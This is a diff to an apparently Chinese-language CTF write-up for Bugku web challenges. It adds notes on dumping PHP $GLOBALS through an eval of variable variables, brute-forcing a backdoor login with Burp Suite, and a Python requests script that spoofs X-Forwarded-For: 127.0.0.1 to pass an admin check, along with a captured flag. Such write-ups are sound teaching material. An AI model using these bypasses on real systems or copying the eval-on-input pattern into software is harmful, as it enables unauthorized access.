@@ -101,7 +101,7 @@ while True:
 
 # 变量1
 
-GLOBALS全局变量
+参数args值必须是由[A-Za-z0-9]字符集组成,并且将args值作为新的变量输出然后eval函数执行 根据题目的示,flag值是一个变量,然而这个变量并不在我们访问的php文件中有定义，所以我们可以猜测flag可能是一个全局变量，php的全局变量是$GLOBALS，所以可以给参数args赋值GLOBALS，就可以将全局变量输出出来
 
 ```php
 flag In the variable ! <?php  
@@ -111,6 +111,7 @@ highlight_file(__file__);
 if(isset($_GET['args'])){
     $args = $_GET['args'];
     if(!preg_match("/^\w+$/",$args)){
+    // 这个正则表达式的意思是匹配任意 [A-Za-z0-9_] 的字符，就是任意大小写字母和0到9以及下划线组成
         die("args error!");
     }
     eval("var_dump($$args);");
@@ -132,6 +133,17 @@ JavaScript代码组成的表达式
 
 ![头等舱](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E5%A4%B4%E7%AD%89%E8%88%B1.png)
 
+也可以借助python的requests库
+
+```python
+import requests
+
+url = "http://123.206.87.240:9009/hd.php"
+r = requests.get(url)
+d = r.headers
+print(d)
+```
+
 # 网站被黑
 
 使用御剑进行扫描，发现一个后门网站
@@ -142,7 +154,7 @@ JavaScript代码组成的表达式
 
 ![网站被黑2](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%912.png)
 
-使用burpsuite进行暴力破解
+使用burpsuite进行暴力破解，length不和其他一样的即为密码。
 
 ![网站被黑3](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%913.png)
 
@@ -159,6 +171,20 @@ JavaScript代码组成的表达式
 提示中有**本地**，使用burpsuit抓包，修改XFF，【XFF：HTTP 请求头中的 X-Forwarded-For，用来表示 HTTP 请求端真实 IP】，抓包后，send to repeater，添加X-Forwarded-For：127.0.0.1，GO
 
 ![管理员系统](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F.png)
+
+也可以借助python的requests库
+
+```python
+import requests
+
+url = "http://123.206.31.85:1003/"
+payload = {'user': 'admin', 'pass': 'test123'}
+headers = {'X-Forwarded-For': '127.0.0.1'}
+r = requests.post(url, data=payload, headers=headers)
+print(r.text)
+
+# <font style="color:#FF0000"><h3>The flag is: 85ff2ee4171396724bae20c0bd851f6b</h3><br\></font\>
+```
 
 # web4
 
